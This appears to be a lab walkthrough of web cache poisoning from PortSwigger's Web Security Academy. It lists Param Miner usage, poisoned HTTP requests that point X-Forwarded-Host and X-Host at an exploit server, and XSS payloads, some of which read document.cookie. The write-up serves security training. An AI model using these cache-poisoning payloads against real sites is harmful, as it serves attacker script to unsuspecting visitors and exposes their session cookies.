## General info

Use [Param Miner](https://github.com/PortSwigger/param-miner) to automate process of finding unkeyed inputs right-click on a request that you want to investigate and click "Guess headers". 
Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the 
"Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite 
Community Edition.

- Don't forget to **use cache buster param**.
- Use the **Pragma: x-get-cache-key** header to display the cache key in the response.
- Websites often exclude certain UTM analytics parameters from the cache key.

## LAB payloads
#### Web cache poisoning with an unkeyed header
- using param miner find that there is unkeyed X-Forwarded-Host header
- find that it value is reflected inside body script tag
- use cache buster ?c=2123123
```
X-Forwarded-Host: exploit-...exploit-server.net

--> exploit server
/resources/js/tracking.js

alert(document.cookie);
```

#### Web cache poisoning with an unkeyed cookie
- find fehost cookie
- change it and find that it is being reflected inside data dict of script tag. break it:
``` 
fehost=\\"-alert(1)}//
```
or
``` 
fegost=somestr"-alert(1)-"somestr
```

#### Web cache poisoning with multiple headers
- use cache buster
- find tracking js
- run param miner:
```
Identified parameter on ...web-security-academy.net: x-forwarded-scheme
```
- find that if you use X-Forwarded-Host and X-Forwarded-Scheme with https - nothing works
use http:
```
X-Forwarded-Host: exploit-...exploit-server.net/resources/js/tracking.js
X-Forwarded-Scheme: http
```
- on exploit 
```
alert(document.cookie)
```
```
GET /resources/js/tracking.js HTTP/2
Host: ...web-security-academy.net
X-Forwarded-Host: exploit-...exploit-server.net
X-Forwarded-Scheme: http
```

#### Targeted web cache poisoning using an unknown header
- use cache buster
- find that on blog page
```html
<script type="text/javascript" src="//...h1-web-security-academy.net/resources/js/tracking.js"></script>
```
- also there is GET request
```
GET /post/comment?postId=5 HTTP/1.1
```
- and response:
```
[{"avatar":"","website":"","date":"2026-01-10T10:10:02.620Z","body":"My mom was a famous writer, I'll put you in touch if you like.","author":"Russell Up"}]
```
- loadComments.js with DOM purify lib
- notice that: **Vary: User-Agent** - it means that user agent is a part of key
- Param-miner: X-Host, Origin, Via
- use X-Host and find that it is being reflected. use exploit adress with path /resources/js/tracking.js
- find that you can get xss triggered 
- comment with:
```html
<img src=\"https://exploit-...exploit-server.net/resources/js/tracking.js\">
```
- spam
```
GET /post?postId=5 HTTP/1.1
Host: ...h1-web-security-academy.net
X-Host: exploit-...exploit-server.net
```
- in logs of exploit server find victim user agent
```
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```
- spam until hit:
```
GET /post?postId=5 HTTP/1.1
Host: ...h1-web-security-academy.net
X-Host: exploit-...exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

#### Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
- use cache buster
- find that initGeoLocate uses as input jsonUrl, which is contructed as **'//'+data.host+'/resources/json/geolocate.
  json'**
- find data dict inside script tag
- run param miner, for / param miner should find **x-forwarded-host**
- find that value of that header is being reflected
- on exploit: **/resources/json/geolocate.json**
- in the head add **Access-Control-Allow-Origin: * **
- in the body:
```
{"country":"<svg onload=alert(1)>"}
```
- trigger alert
```
{"country":"<svg onload=alert(document.cookie)>"}
```
alt payload: 
```
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}
```
- find victim user agent inside logs
- spam until hit:
```
GET / HTTP/2
Host: ...web-security-academy.net
Cookie: session=...;
X-Forwarded-Host: exploit-...exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

#### Web cache poisoning via an unkeyed query string
- find link with canonical rel attribute
```
GET /
GET //
GET ////
```
- they all being reflected inside canonical link
```
GET /?v=>'><script>alert(1)</script> HTTP/2
Host: ...web-security-academy.net
```
- remove cache buster and poison home page
- alt. payload
```
GET /?evil='/><script>alert(1)</script>
```

#### Web cache poisoning via an unkeyed query parameter
- again canonical link reflects url params
- run param miner, it should find utm_content
```
GET /?utm_content='><script>alert(1)</script>
```
or
```
GET /?utm_content='/><script>alert(1)</script>
```

#### Parameter cloaking
- Identify that the utm_content parameter is supported. Observe that it is also excluded from the cache key.
- Notice that if you use a semicolon (;) to append another parameter to **utm_content**, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. 
- Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
- Observe that every page imports the script **/js/geolocate.js**, executing the callback function **setCountryCookie()**. Send the request 
    ```
    GET /js/geolocate.js?callback=setCountryCookie
    ``` 
  to Burp Repeater.
- **Notice that you can control the name of the function that is called on the returned data by editing the callback parameter**. However, you can't poison the cache for other users in this way because the parameter is keyed.
- Study the cache behavior. **Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed**. However, if you append the second callback parameter to the **utm_content** parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response: 
    ```
  GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
  
  HTTP/1.1 200 OK
  X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
  …
  arbitraryFunction({"country" : "United Kingdom"})
  ```
- pass in alert(1) as the callback function
    ```
  GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
  ```
- cache, trigger

#### Web cache poisoning via a fat GET request
- find this:
```html
<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
```
- find GET to **/js/geolocate.js?callback=setCountryCookie**
- send it to repeater
- add to the body
```
callback=alert(1)
```

#### URL normalization
- find that if you go to the random path it is reflected in response
```
Not found: /your-rndm-path
```
- spam
```
GET /rndm<script>alert(1)</script>
```
- then send to victim
```
https://...web-security-academy.net/rndm%3Cscript%3Ealert(1)%3C/script%3E
```